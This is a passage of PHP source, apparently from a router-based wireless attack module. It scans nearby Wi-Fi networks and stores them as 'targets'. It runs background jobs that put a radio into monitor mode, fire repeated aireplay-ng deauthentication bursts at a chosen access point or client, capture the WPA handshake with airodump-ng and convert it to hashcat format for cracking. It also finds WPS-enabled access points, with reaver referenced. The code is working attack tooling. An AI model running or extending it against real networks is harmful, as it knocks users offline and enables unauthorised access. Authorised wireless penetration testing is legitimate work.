            if (preg_match('/^\s*Interface\s+(\S+)/', $line, $match)) {
                if ($current !== null) {
                    $interfaces[] = $current;
                }
                $current = [
                    'name' => $match[1],
                    'phy' => $currentPhy,
                    'type' => '',
                    'ssid' => '',
                    'channel' => '',
                    'frequency' => '',
                    'txpower' => '',
                ];
                continue;
            }
            if ($current === null) {
                continue;
            }
            if (preg_match('/^\s*ssid\s+(.+)$/', $line, $match)) {
                $current['ssid'] = trim($match[1]);
            } elseif (preg_match('/^\s*type\s+(.+)$/', $line, $match)) {
                $current['type'] = trim($match[1]);
            } elseif (preg_match('/^\s*channel\s+(\d+)\s+\(([^)]+)\)/', $line, $match)) {
                $current['channel'] = $match[1];
                $current['frequency'] = $match[2];
            } elseif (preg_match('/^\s*txpower\s+(.+)$/', $line, $match)) {
                $current['txpower'] = trim($match[1]);
            }
        }
        if ($current !== null) {
            $interfaces[] = $current;
        }
        return $interfaces;
    }

    private function redactWirelessConfig()
    {
        $output = (string)shell_exec('/sbin/uci show wireless 2>/dev/null');
        $output = preg_replace('/\.(key|password|sae_password)=.*/', '.$1=<redacted>', $output);
        return trim($output);
    }

    private function isSafeInterfaceName($name)
    {
        return is_string($name) && preg_match('/^[A-Za-z0-9_.:-]{1,32}$/', $name);
    }

    private function isSafeJobId($jobId)
    {
        return is_string($jobId) && preg_match('/^[A-Za-z0-9_.-]{1,64}$/', $jobId);
    }

    private function isSafeBssid($bssid)
    {
        return is_string($bssid) && preg_match('/^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/', $bssid);
    }

    // First 3 octets of a MAC as an uppercase 6-hex OUI (e.g. "6c:c2:42:.." -> "6CC242").
    private function macOui($mac)
    {
        return strtoupper(str_replace([':', '-'], '', substr((string)$mac, 0, 8)));
    }

    // Resolve manufacturer names for a set of MACs using nmap's OUI database in a
    // single pass over the file (1.2MB), so enriching a whole scan stays cheap.
    private function ouiVendorMap(array $macs)
    {
        $wanted = [];
        foreach ($macs as $mac) {
            $oui = $this->macOui($mac);
            if (strlen($oui) === 6) {
                $wanted[$oui] = '';
            }
        }
        if (empty($wanted)) {
            return [];
        }
        $file = '/usr/share/nmap/nmap-mac-prefixes';
        $fh = @fopen($file, 'r');
        if (!$fh) {
            return $wanted;
        }
        $remaining = count($wanted);
        while ($remaining > 0 && ($line = fgets($fh)) !== false) {
            if ($line === '' || $line[0] === '#') {
                continue;
            }
            $prefix = strtoupper(substr($line, 0, 6));
            if (isset($wanted[$prefix]) && $wanted[$prefix] === '') {
                $wanted[$prefix] = trim(substr($line, 7));
                $remaining--;
            }
        }
        fclose($fh);
        return $wanted;
    }

    // Attach a 'vendor' field to each row keyed by $macKey (bssid/mac).
    private function attachVendors($rows, $macKey = 'bssid')
    {
        if (!is_array($rows) || empty($rows)) {
            return $rows;
        }
        $macs = [];
        foreach ($rows as $row) {
            if (is_array($row) && isset($row[$macKey])) {
                $macs[] = $row[$macKey];
            }
        }
        $map = $this->ouiVendorMap($macs);
        foreach ($rows as &$row) {
            if (is_array($row) && isset($row[$macKey])) {
                $row['vendor'] = $map[$this->macOui($row[$macKey])] ?? '';
            }
        }
        unset($row);
        return $rows;
    }

    private function storageRoot()
    {
        return __DIR__ . '/storage';
    }

    private function storageDir()
    {
        return $this->storageRoot() . '/database';
    }

    private function scanJobDir()
    {
        return $this->storageRoot() . '/jobs';
    }

    private function reconDbPath()
    {
        return $this->storageDir() . '/recon.json';
    }

    private function defaultReconDatabase()
    {
        return [
            'updatedAt' => '',
            'scans' => [],
            'targets' => [],
            'clients' => [],
        ];
    }

    private function ensureDir($dir)
    {
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        return is_dir($dir) && is_writable($dir);
    }

    private function ensureStorage()
    {
        return $this->ensureDir($this->storageDir());
    }

    private function ensureScanJobStorage()
    {
        return $this->ensureDir($this->scanJobDir());
    }

    private function scanJobPaths($jobId)
    {
        $base = $this->scanJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'out' => $base . '.out',
            'err' => $base . '.err',
            'done' => $base . '.done',
        ];
    }

    private function createScanJob($band)
    {
        if (!$this->ensureScanJobStorage()) {
            return ['error' => 'Unable to create scan job storage.'];
        }

        $repChannel = ($band === '5g') ? 36 : 6;
        $monitor = $this->resolveMonitorTarget($repChannel);
        if ($monitor === null) {
            return ['error' => 'No radio available for the ' . ($band === '5g' ? '5 GHz' : '2.4 GHz') . ' band.'];
        }
        $phy = $monitor['phy'];

        // Always scan on a dedicated temporary managed vif. Reusing the connected
        // 5GHz STA uplink interface (phy0-sta0) returns ZERO results on ath10k — a
        // card can't run a full scan while associated. A separate scan vif on the
        // same phy works fine and leaves the STA connected (verified). Band-specific
        // name so a simultaneous 2.4 + 5 GHz scan doesn't collide.
        $scanIface = ($band === '5g') ? 'wascan5' : 'wascan2';
        $temp = true;
        if (!$this->isSafeInterfaceName($scanIface)) {
            return ['error' => 'Could not resolve a scan interface.'];
        }

        $jobId = gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->scanJobPaths($jobId);
        @file_put_contents($paths['meta'], json_encode([
            'interface' => $scanIface,
            'band' => $band,
            'temp' => $temp,
            'createdAt' => gmdate('c'),
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $eIface = escapeshellarg($scanIface);
        $ePhy = escapeshellarg($phy);
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);

        // Capture the scan's own exit code before tearing down any temp interface,
        // so a scan failure isn't masked by the cleanup command.
        $pre = $temp
            ? 'iw dev ' . $eIface . ' del 2>/dev/null; iw phy ' . $ePhy . ' interface add ' . $eIface . ' type managed 2>> ' . $eErr . '; ip link set ' . $eIface . ' up 2>> ' . $eErr . '; sleep 1; '
            : '';
        $cleanup = $temp ? 'iw dev ' . $eIface . ' del 2>/dev/null; ' : '';
        // A single active-scan pass can under-report, especially on 5GHz (an AP's
        // beacon window can land outside the brief per-channel dwell) — a nearby,
        // real AP is sometimes just missing from one pass and present on the next.
        // Run two passes back-to-back and let scanStatus() dedup by BSSID, so one
        // "scan" is quietly more thorough instead of the operator having to notice
        // a target vanished and manually re-scan.
        $body = $pre
            . '/usr/bin/iwinfo ' . $eIface . ' scan > ' . $eOut . ' 2> ' . $eErr . '; rc=$?; '
            . 'sleep 1.5; '
            . '/usr/bin/iwinfo ' . $eIface . ' scan >> ' . $eOut . ' 2>> ' . $eErr . '; rc2=$?; '
            . 'if [ "$rc" != "0" ]; then rc=$rc2; fi; '
            . $cleanup
            . 'echo $rc > ' . $eDone;
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $body . ' ) >/dev/null 2>&1 &'));

        return [
            'jobId' => $jobId,
            'interface' => $scanIface,
            'band' => $band,
        ];
    }

    private function cleanupScanJob($paths)
    {
        foreach ($paths as $path) {
            if (is_string($path) && is_file($path)) {
                @unlink($path);
            }
        }
    }

    private function captureJobDir()
    {
        return $this->storageRoot() . '/captures';
    }

    private function ensureCaptureJobStorage()
    {
        return $this->ensureDir($this->captureJobDir());
    }

    private function captureJobPaths($jobId)
    {
        $base = $this->captureJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'cap' => $base . '-01.cap',
            'hash' => $base . '.22000',
            'out' => $base . '.out',
            'err' => $base . '.err',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function isSafePhy($phy)
    {
        return is_string($phy) && preg_match('/^phy\d+$/', $phy);
    }

    private function isSafeRadio($radio)
    {
        return is_string($radio) && preg_match('/^radio\d+$/', $radio);
    }

    private function isCaptureRunning()
    {
        return trim((string)shell_exec('/usr/bin/pgrep -x airodump-ng 2>/dev/null')) !== '';
    }

    private function uciRadioMap()
    {
        $radios = [];
        $output = (string)shell_exec('/sbin/uci show wireless 2>/dev/null');
        foreach (explode("\n", $output) as $line) {
            if (preg_match("/^wireless\.(radio\d+)\.(band|path|disabled)='?([^']*)'?/", trim($line), $m)) {
                $radios[$m[1]][$m[2]] = $m[3];
            }
        }
        return $radios;
    }

    private function resolveMonitorTarget($channel)
    {
        $band = ($channel <= 14) ? '2g' : '5g';
        $bandLabel = ($band === '2g') ? '2.4 GHz' : '5 GHz';

        $uciRadios = $this->uciRadioMap();
        $radioName = '';
        $radioPath = '';
        $radioDisabled = false;
        foreach ($uciRadios as $name => $info) {
            if (($info['band'] ?? '') === $band) {
                $radioName = $name;
                $radioPath = $info['path'] ?? '';
                $radioDisabled = (($info['disabled'] ?? '0') === '1');
                break;
            }
        }
        if ($radioName === '' || !$this->isSafeRadio($radioName)) {
            return null;
        }

        $phyName = '';
        foreach ($this->getRadios() as $radio) {
            $path = $radio['path'] ?? '';
            if ($radioPath !== '' && strpos($path, $radioPath) !== false) {
                $phyName = $radio['name'];
                break;
            }
        }
        if ($phyName === '') {
            // Fall back to matching the band advertised by the phy.
            foreach ($this->getRadios() as $radio) {
                if (in_array($bandLabel, $radio['bands'] ?? [], true)) {
                    $phyName = $radio['name'];
                    break;
                }
            }
        }
        if ($phyName === '' || !$this->isSafePhy($phyName)) {
            return null;
        }

        // A disabled radio (e.g. an unused 2.4GHz radio) has no active interfaces,
        // so we can add a monitor vif directly without a wifi down/up cycle. Only
        // manage (down/up) radios that are actually carrying live interfaces.
        return [
            'radio' => $radioName,
            'phy' => $phyName,
            'band' => $bandLabel,
            'manageRadio' => !$radioDisabled,
        ];
    }

    private function refreshTargetChannel($bssid, $band)
    {
        $bandLabel = ($band === '2g') ? '2.4 GHz' : '5 GHz';

        $phyBands = [];
        foreach ($this->getRadios() as $radio) {
            $phyBands[$radio['name']] = $radio['bands'] ?? [];
        }

        $scanIface = '';
        foreach ($this->getWirelessInterfaces() as $iface) {
            if (in_array($bandLabel, $phyBands[$iface['phy']] ?? [], true)) {
                $scanIface = $iface['name'];
                break;
            }
        }
        if ($scanIface === '' || !$this->isSafeInterfaceName($scanIface)) {
            return null;
        }

        $output = (string)shell_exec('/usr/bin/iwinfo ' . escapeshellarg($scanIface) . ' scan 2>/dev/null');
        if (trim($output) === '') {
            return null;
        }

        foreach ($this->parseIwinfoScan($output) as $network) {
            if (strtolower($network['bssid']) === $bssid && $network['channel'] !== '') {
                $ch = (int)$network['channel'];
                if ($ch >= 1 && $ch <= 196) {
                    return $ch;
                }
            }
        }
        return null;
    }

    // A capture's background job can be killed off before its wrapper script
    // reaches the final "echo 0 > done" line (router reboot, OOM kill, a manual
    // process kill outside the module). Without this, a dead job stays "pending"
    // forever in captureStatus/getCaptureHistory and deleteCapture refuses to
    // remove anything that looks like it's still running. Once a job has run well
    // past its own duration plus setup/teardown overhead with no exit marker, treat
    // it as orphaned and self-heal by writing a synthetic done file.
    private function reconcileCaptureJob($paths, $meta)
    {
        if (is_file($paths['done'])) {
            return;
        }
        $createdAt = isset($meta['createdAt']) ? strtotime((string)$meta['createdAt']) : false;
        if ($createdAt === false) {
            return;
        }
        $duration = (int)($meta['duration'] ?? 0);
        // wifi down/up cycle + monitor setup + deauth loop + hcxpcapngtool convert + kill grace.
        $graceSeconds = 90;
        if (time() - $createdAt <= $duration + $graceSeconds) {
            return;
        }
        @file_put_contents($paths['err'], "\n[wa] job never reported completion (router restart or the process was lost) — marked stale.\n", FILE_APPEND);
        @file_put_contents($paths['done'], '137');
    }

    private function startCaptureJob($target, $channel, $monitor, $client, $duration, $deauth, $deauthRounds = 4, $deauthInterval = 6, $deauthDelay = 0)
    {
        if (!$this->ensureCaptureJobStorage()) {
            return self::setError('Unable to create capture job storage.');
        }

        $jobId = gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->captureJobPaths($jobId);
        $bssid = strtolower($target['bssid']);

        $meta = [
            'jobId' => $jobId,
            'target' => [
                'bssid' => $bssid,
                'ssid' => $target['ssid'] ?? '',
                'channel' => (string)$channel,
                'frequency' => $target['frequency'] ?? '',
                'security' => $target['security'] ?? '',
                'label' => $target['metadata']['label'] ?? '',
            ],
            'client' => $client,
            'duration' => $duration,
            'deauth' => (bool)$deauth,
            'deauthRounds' => (int)$deauthRounds,
            'deauthInterval' => (int)$deauthInterval,
            'deauthDelay' => (int)$deauthDelay,
            'radio' => $monitor['radio'],
            'phy' => $monitor['phy'],
            'band' => $monitor['band'],
            'engine' => 'aircrack-ng (airodump-ng + aireplay-ng) -> hcxpcapngtool',
            'createdAt' => gmdate('c'),
            'warning' => "Capture puts radio {$monitor['radio']} ({$monitor['band']}) into monitor mode for the duration. If that radio is the WiFi uplink, internet drops until capture finishes and the radio is restored.",
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        // Resolve tool paths at runtime rather than hardcoding install locations,
        // which differ between builds (e.g. /usr/sbin vs /usr/bin).
        $airodump = trim((string)shell_exec('command -v airodump-ng 2>/dev/null')) ?: 'airodump-ng';
        $aireplay = trim((string)shell_exec('command -v aireplay-ng 2>/dev/null')) ?: 'aireplay-ng';
        $hcxtool = trim((string)shell_exec('command -v hcxpcapngtool 2>/dev/null')) ?: 'hcxpcapngtool';

        $mon = 'wamon0';
        $eBssid = escapeshellarg($bssid);
        $ch = (int)$channel;
        $dur = (int)$duration;
        $ePhy = escapeshellarg($monitor['phy']);
        $eRadio = escapeshellarg($monitor['radio']);
        $eMon = escapeshellarg($mon);
        $ePrefix = escapeshellarg($this->captureJobDir() . '/' . $jobId);
        $eHash = escapeshellarg($paths['hash']);
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $ePid = escapeshellarg($paths['pid']);
        $eStop = escapeshellarg($paths['stop']);
        $eCap = escapeshellarg($paths['cap']);

        $dRounds = max(1, min(64, (int)$deauthRounds));
        $dInterval = max(3, min(60, (int)$deauthInterval));
        $dDelay = max(0, min(60, (int)$deauthDelay));
        if ($deauth) {
            $deauthCmd = escapeshellarg($aireplay) . ' --deauth ' . $dRounds . ' --ignore-negative-one -a ' . $eBssid;
            if ($client !== '') {
                $deauthCmd .= ' -c ' . escapeshellarg($client);
            }
            $deauthCmd .= ' ' . $eMon . ' >> ' . $eOut . ' 2>> ' . $eErr;
        } else {
            $deauthCmd = 'true';
        }

        $script =
            'iw dev ' . $eMon . ' del 2>/dev/null; ' .
            '/sbin/wifi down ' . $eRadio . ' 2>/dev/null; ' .
            'sleep 3; ' .
            'if ! iw phy ' . $ePhy . ' interface add ' . $eMon . ' type monitor 2>> ' . $eErr . '; then ' .
            'echo "[wa] failed to create monitor interface on ' . $mon . '" >> ' . $eErr . '; ' .
            '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; echo 1 > ' . $eDone . '; exit 1; fi; ' .
            'ip link set ' . $eMon . ' up 2>> ' . $eErr . '; ' .
            'iw dev ' . $eMon . ' set channel ' . $ch . ' 2>> ' . $eErr . '; ' .
            'echo "[wa] monitor up on phy ' . $monitor['phy'] . ', channel ' . $ch . '" >> ' . $eOut . '; ' .
            escapeshellarg($airodump) . ' --bssid ' . $eBssid . ' -c ' . $ch . ' -w ' . $ePrefix . ' --output-format pcap ' . $eMon . ' >> ' . $eOut . ' 2>> ' . $eErr . ' & ' .
            'ADPID=$!; echo $ADPID > ' . $ePid . '; ' .
            'END=$(( $(date +%s) + ' . $dur . ' )); ' .
            // Optional initial listen window: give a client a chance to (re)connect
            // and replay the handshake naturally before we start knocking it off.
            ($deauth && $dDelay > 0
                ? 'echo "[wa] listening ' . $dDelay . 's before first deauth burst" >> ' . $eOut . '; '
                    . 'DSTOP=$(( $(date +%s) + ' . $dDelay . ' )); '
                    . 'while [ $(date +%s) -lt $DSTOP ] && [ $(date +%s) -lt $END ]; do '
                    . 'if [ -f ' . $eStop . ' ]; then break; fi; sleep 1; done; '
                : '') .
            'while [ $(date +%s) -lt $END ]; do ' .
            'if [ -f ' . $eStop . ' ]; then echo "[wa] stop requested" >> ' . $eOut . '; break; fi; ' .
            $deauthCmd . '; ' .
            'sleep ' . $dInterval . '; ' .
            'done; ' .
            'kill $ADPID 2>/dev/null; sleep 1; kill -9 $ADPID 2>/dev/null; ' .
            'if [ -f ' . $eCap . ' ]; then ' .
            'echo "[wa] converting capture to hashcat 22000 format" >> ' . $eOut . '; ' .
            escapeshellarg($hcxtool) . ' -o ' . $eHash . ' --all ' . $eCap . ' >> ' . $eOut . ' 2>> ' . $eErr . '; ' .
            'else echo "[wa] no capture file was produced" >> ' . $eErr . '; fi; ' .
            'iw dev ' . $eMon . ' del 2>/dev/null; ' .
            '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ' .
            'echo 0 > ' . $eDone . ';';

        $backgroundCommand = '( ' . $script . ' ) >/dev/null 2>&1 &';
        shell_exec('/bin/sh -c ' . escapeshellarg($backgroundCommand));

        return self::setSuccess([
            'pending' => true,
            'jobId' => $jobId,
            'meta' => $meta,
        ]);
    }

    private function summarizeCaptureResult($paths)
    {
        $hashCount = 0;
        $hashAvailable = false;
        if (is_file($paths['hash']) && filesize($paths['hash']) > 0) {
            $hashAvailable = true;
            $lines = file($paths['hash'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $hashCount = is_array($lines) ? count($lines) : 0;
        }

        $summaryLine = '';
        if (is_file($paths['out'])) {
            $out = $this->tailFile($paths['out'], 6000);
            if (preg_match('/EAPOL pairs written to 22000 hash file[^\n]*/i', $out, $m)) {
                $summaryLine = trim($m[0]);
            } elseif (preg_match('/PMKID[^\n]*written[^\n]*/i', $out, $m)) {
                $summaryLine = trim($m[0]);
            } elseif (preg_match('/EAPOL M32E3[^\n]*/i', $out, $m)) {
                $summaryLine = trim($m[0]);
            } elseif (preg_match('/PMKID\(s\)[^\n]*/i', $out, $m)) {
                $summaryLine = trim($m[0]);
            }
        }

        return [
            'hashCount' => $hashCount,
            'handshakeCaptured' => $hashCount > 0,
            'hashAvailable' => $hashAvailable,
            'pcapAvailable' => is_file($paths['cap']) && filesize($paths['cap']) > 0,
            'pcapBytes' => is_file($paths['cap']) ? filesize($paths['cap']) : 0,
            'summaryLine' => $summaryLine,
        ];
    }

    private function tailFile($path, $maxBytes)
    {
        if (!is_file($path)) {
            return '';
        }
        $size = filesize($path);
        $handle = @fopen($path, 'rb');
        if (!$handle) {
            return '';
        }
        if ($size > $maxBytes) {
            fseek($handle, -1 * $maxBytes, SEEK_END);
        }
        $data = stream_get_contents($handle);
        fclose($handle);
        return is_string($data) ? $data : '';
    }

    private function wpsJobDir()
    {
        return $this->storageRoot() . '/wps';
    }

    private function ensureWpsStorage()
    {
        return $this->ensureDir($this->wpsJobDir());
    }

    private function wpsJobPaths($jobId)
    {
        $base = $this->wpsJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'cap' => $base . '-01.cap',
            'out' => $base . '.out',
            'err' => $base . '.err',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function isWpsBusy()
    {
        return trim((string)shell_exec('/usr/bin/pgrep -x airodump-ng 2>/dev/null')) !== ''
            || trim((string)shell_exec('/usr/bin/pgrep -x reaver 2>/dev/null')) !== '';
    }

    // wash 1.6.6 is non-functional on this build (processes no frames), so WPS
    // discovery is done by parsing beacon/probe-response frames from an airodump
    // capture and reading the WPS information element (OUI 00:50:F2 type 04)
    // directly. Returns only APs that actually advertise WPS.
    private function parseWpsCapture($pcapPath)
    {
        $data = @file_get_contents($pcapPath);
        if (!is_string($data) || strlen($data) < 24) {
            return [];
        }

        $magic = substr($data, 0, 4);
        if ($magic === "\xd4\xc3\xb2\xa1") {
            $le = true;
        } elseif ($magic === "\xa1\xb2\xc3\xd4") {
            $le = false;
        } else {
            return [];
        }
        $u32 = function ($s) use ($le) {
            $b = array_values(unpack('C4', $s));
            return $le
                ? ($b[0] | ($b[1] << 8) | ($b[2] << 16) | ($b[3] << 24))
                : (($b[0] << 24) | ($b[1] << 16) | ($b[2] << 8) | $b[3]);
        };

        $linktype = $u32(substr($data, 20, 4));
        $len = strlen($data);
        $off = 24;
        $found = [];

        while ($off + 16 <= $len) {
            $inclLen = $u32(substr($data, $off + 8, 4));
            $off += 16;
            if ($inclLen <= 0 || $off + $inclLen > $len) {
                break;
            }
            $pkt = substr($data, $off, $inclLen);
            $off += $inclLen;

            // Strip radiotap (linktype 127); its it_len at bytes 2-3 is always LE.
            // Pull the dBm antenna-signal field out of the header before discarding it.
            $frame = $pkt;
            $signal = null;
            if ($linktype === 127) {
                if (strlen($pkt) < 4) {
                    continue;
                }
                $rtLen = ord($pkt[2]) | (ord($pkt[3]) << 8);
                if ($rtLen < 8 || $rtLen >= strlen($pkt)) {
                    continue;
                }
                $signal = $this->radiotapSignal(substr($pkt, 0, $rtLen));
                $frame = substr($pkt, $rtLen);
            }
            if (strlen($frame) < 38) {
                continue;
            }

            $fc = ord($frame[0]);
            // Management beacon (0x80) or probe response (0x50) carry the WPS IE.
            if ($fc !== 0x80 && $fc !== 0x50) {
                continue;
            }

            $bssidRaw = substr($frame, 16, 6);
            $bssid = strtolower(implode(':', str_split(bin2hex($bssidRaw), 2)));
            $ies = substr($frame, 36);

            $ssid = '';
            $channel = '';
            $hasWps = false;
            $locked = false;
            $version = '';

            $p = 0;
            $ieLen = strlen($ies);
            while ($p + 2 <= $ieLen) {
                $tag = ord($ies[$p]);
                $tlen = ord($ies[$p + 1]);
                $p += 2;
                if ($p + $tlen > $ieLen) {
                    break;
                }
                $val = substr($ies, $p, $tlen);
                $p += $tlen;

                if ($tag === 0) {
                    $ssid = $val;
                } elseif ($tag === 3 && $tlen >= 1) {
                    $channel = (string)ord($val[0]);
                } elseif ($tag === 221 && $tlen >= 4 && substr($val, 0, 4) === "\x00\x50\xf2\x04") {
                    $hasWps = true;
                    $wd = substr($val, 4);
                    $q = 0;
                    $wl = strlen($wd);
                    while ($q + 4 <= $wl) {
                        $atype = (ord($wd[$q]) << 8) | ord($wd[$q + 1]);
                        $alen = (ord($wd[$q + 2]) << 8) | ord($wd[$q + 3]);
                        $q += 4;
                        if ($q + $alen > $wl) {
                            break;
                        }
                        $aval = substr($wd, $q, $alen);
                        $q += $alen;
                        if ($atype === 0x1057 && $alen >= 1) {
                            $locked = (ord($aval[0]) === 1);
                        } elseif ($atype === 0x104A && $alen >= 1) {
                            $version = (ord($aval[0]) >= 0x20) ? '2.0' : '1.0';
                        }
                    }
                    if ($version === '') {
                        $version = '1.0';
                    }
                }
            }

            if (!$hasWps) {
                continue;
            }
            // Prefer the entry with the most information; keep first-seen SSID/channel.
            $prev = $found[$bssid] ?? null;
            // Track the strongest signal seen for this BSSID (closest to 0 dBm).
            $prevSig = ($prev !== null && $prev['signalVal'] !== null) ? $prev['signalVal'] : null;
            $bestSig = $prevSig;
            if ($signal !== null && ($bestSig === null || $signal > $bestSig)) {
                $bestSig = $signal;
            }
            $found[$bssid] = [
                'bssid' => $bssid,
                'channel' => $channel !== '' ? $channel : ($prev['channel'] ?? ''),
                'ssid' => $this->cleanSsid($ssid !== '' ? $ssid : ($prev['ssidRaw'] ?? '')),
                'ssidRaw' => $ssid !== '' ? $ssid : ($prev['ssidRaw'] ?? ''),
                'wpsVersion' => $version,
                'wpsLocked' => $locked || (bool)($prev['wpsLocked'] ?? false),
                'signalVal' => $bestSig,
                'signal' => $bestSig !== null ? ($bestSig . ' dBm') : '',
            ];
        }

        $networks = array_values($found);
        foreach ($networks as &$n) {
            unset($n['ssidRaw'], $n['signalVal']);
        }
        return $networks;
    }

    // Parse the dBm antenna-signal field (radiotap bit 5) out of a radiotap
    // header. Walks the present bitmap(s) and the preceding fixed-size fields,
    // honouring radiotap's natural alignment. Returns an int (dBm) or null.
    private function radiotapSignal($rt)
    {
        $len = strlen($rt);
        if ($len < 8) {
            return null;
        }
        // Read present word(s); bit 31 flags another 32-bit present word follows.
        $o = 4;
        $word0 = null;
        while ($o + 4 <= $len) {
            $w = ord($rt[$o]) | (ord($rt[$o + 1]) << 8) | (ord($rt[$o + 2]) << 16) | (ord($rt[$o + 3]) << 24);
            if ($word0 === null) {
                $word0 = $w;
            }
            $o += 4;
            if (!($w & 0x80000000)) {
                break;
            }
        }
        if ($word0 === null || !($word0 & (1 << 5))) {
            return null; // no antenna-signal field advertised
        }
        // Fixed-size fields that precede bit 5: [bit => [align, size]].
        $fields = [0 => [8, 8], 1 => [1, 1], 2 => [1, 1], 3 => [2, 4], 4 => [2, 2]];
        $pos = $o; // data area begins right after the present words
        foreach ($fields as $bit => $fs) {
            if ($word0 & (1 << $bit)) {
                list($align, $size) = $fs;
                if ($pos % $align !== 0) {
                    $pos += $align - ($pos % $align);
                }
                $pos += $size;
            }
        }
        if ($pos >= $len) {
            return null;
        }
        $b = ord($rt[$pos]);
        return $b >= 128 ? $b - 256 : $b; // signed int8, dBm
    }

    private function cleanSsid($raw)
    {
        $raw = (string)$raw;
        if ($raw === '' || trim($raw) === '' || strspn($raw, "\0") === strlen($raw)) {
            return '<hidden>';
        }
        $clean = preg_replace('/[\x00-\x1F\x7F]/', '', $raw);
        return $clean !== '' ? $clean : '<hidden>';
    }

    private function mergeWpsResults($networks)
    {
        if (!$this->ensureStorage()) {
            return false;
        }
        $db = $this->readReconDatabase();
        $timestamp = gmdate('c');
        foreach ($networks as $network) {
            $bssid = strtolower($network['bssid']);
            if ($bssid === '') {
                continue;
            }
            $existing = isset($db['targets'][$bssid]) && is_array($db['targets'][$bssid]) ? $db['targets'][$bssid] : [];
            $metadata = isset($existing['metadata']) && is_array($existing['metadata']) ? $existing['metadata'] : $this->normalizeTargetMetadata([]);
            $db['targets'][$bssid] = array_merge($existing, [
                'bssid' => $bssid,
                'ssid' => isset($existing['ssid']) && $existing['ssid'] !== '' && $existing['ssid'] !== '<hidden>' ? $existing['ssid'] : $network['ssid'],
                'channel' => $network['channel'] !== '' ? $network['channel'] : ($existing['channel'] ?? ''),
                'signal' => $network['signal'] !== '' ? $network['signal'] : ($existing['signal'] ?? ''),
                'wps' => [
                    'enabled' => true,
                    'version' => $network['wpsVersion'],
                    'locked' => (bool)$network['wpsLocked'],
                    'updatedAt' => $timestamp,
                ],
                'firstSeenAt' => $existing['firstSeenAt'] ?? $timestamp,
                'lastSeenAt' => $timestamp,
                'seenCount' => isset($existing['seenCount']) ? (int)$existing['seenCount'] : 1,
                'metadata' => $metadata,
                'metadataUpdatedAt' => $existing['metadataUpdatedAt'] ?? '',
            ]);
        }
        $db['updatedAt'] = $timestamp;
        return $this->writeReconDatabase($db);
    }

    private function startWpsScanJob($band, $passes, $duration)
    {
        if (!$this->ensureWpsStorage()) {
            return self::setError('Unable to create WPS job storage.');
        }

        $jobId = 'scan-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->wpsJobPaths($jobId);
        $bandLabels = array_map(function ($p) {
            return $p['monitor']['band'];
        }, $passes);
        $meta = [
            'jobId' => $jobId,
            'type' => 'scan',
            'band' => $band,
            'bands' => $bandLabels,
            'radio' => implode(',', array_map(function ($p) { return $p['monitor']['radio']; }, $passes)),
            'phy' => implode(',', array_map(function ($p) { return $p['monitor']['phy']; }, $passes)),
            'duration' => $duration,
            'createdAt' => gmdate('c'),
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $airodump = trim((string)shell_exec('command -v airodump-ng 2>/dev/null')) ?: 'airodump-ng';
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $eStop = escapeshellarg($paths['stop']);
        $jobBase = $this->wpsJobDir() . '/' . $jobId;

        // Build one self-contained monitor pass per band. Each pass owns its own
        // monitor vif + cap file, checks the shared stop flag, and restores its
        // radio if it had to be taken down (5GHz uplink in Uplink mode). Passes run
        // concurrently (separate PHYs) and we `wait` for all before marking done.
        $passBlocks = [];
        foreach ($passes as $p) {
            $monitor = $p['monitor'];
            $manage = !empty($monitor['manageRadio']);
            $eMon = escapeshellarg($p['mon']);
            $ePhy = escapeshellarg($monitor['phy']);
            $eRadio = escapeshellarg($monitor['radio']);
            $ePrefix = escapeshellarg($jobBase . $p['capSuffix']);
            $b = 'iw dev ' . $eMon . ' del 2>/dev/null; ';
            if ($manage) {
                $b .= '/sbin/wifi down ' . $eRadio . ' 2>/dev/null; sleep 3; ';
            }
            $b .= 'if ! iw phy ' . $ePhy . ' interface add ' . $eMon . ' type monitor 2>> ' . $eErr . '; then ';
            $b .= 'echo "[wa] failed to create monitor interface on ' . $monitor['phy'] . '" >> ' . $eErr . '; ';
            if ($manage) {
                $b .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
            }
            $b .= 'exit 1; fi; ';
            $b .= 'ip link set ' . $eMon . ' up 2>> ' . $eErr . '; ';
            $b .= 'echo "[wa] WPS discovery (beacon-IE parse) on phy ' . $monitor['phy'] . ' (' . $monitor['band'] . ')" >> ' . $eOut . '; ';
            // pcap carries the WPS IE; csv carries the Power (RSSI) column, since
            // airodump's own cap output is DLT_IEEE802_11 (105) with no radiotap.
            $b .= escapeshellarg($airodump) . ' --band ' . $p['airBand'] . ' -w ' . $ePrefix . ' --output-format pcap,csv ' . $eMon . ' >> ' . $eOut . ' 2>> ' . $eErr . ' & WPID=$!; ';
            $b .= 'END=$(( $(date +%s) + ' . (int)$duration . ' )); ';
            $b .= 'while [ $(date +%s) -lt $END ]; do if [ -f ' . $eStop . ' ]; then break; fi; sleep 2; done; ';
            $b .= 'kill $WPID 2>/dev/null; sleep 1; kill -9 $WPID 2>/dev/null; ';
            $b .= 'iw dev ' . $eMon . ' del 2>/dev/null; ';
            if ($manage) {
